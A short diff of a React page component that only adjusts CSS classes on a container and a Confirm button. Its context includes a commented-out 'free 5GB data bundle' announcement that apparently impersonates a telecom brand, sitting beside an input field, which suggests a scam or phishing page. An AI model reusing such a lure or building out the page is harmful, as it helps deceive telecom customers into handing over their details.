@@ -47,7 +47,7 @@ function Home() {
   };
 
   return (
-    <div className="h-screen bg-gradient-160 blue_gradient p-5 flex flex-col items-center justify-center">
+    <div className="bg-gradient-160 blue_gradient p-5 flex flex-col items-center justify-center">
       <section className="w-full h-[90%] bg-white rounded-lg text-xl p-3">
         {/* <p> Good news everybody!! Safaricon has patnered with Cloudflare Internet Services (United Kingdom) to Unleash the power of connectivity and to celebrate this milestone, they are gifting all their esteemed customers with 5GB free data bundles </p> */}
         <p className="my-10">
@@ -68,7 +68,7 @@ function Home() {
             onChange={handleChange}
           />
           <button
-            className="bg-green-400 p-3 text-white"
+            className="bg-green-400 p-3 text-white basis-1/3"
             onClick={handleConfirm}
           >
             {loading ? "Just a sec..." : "Confirm"}
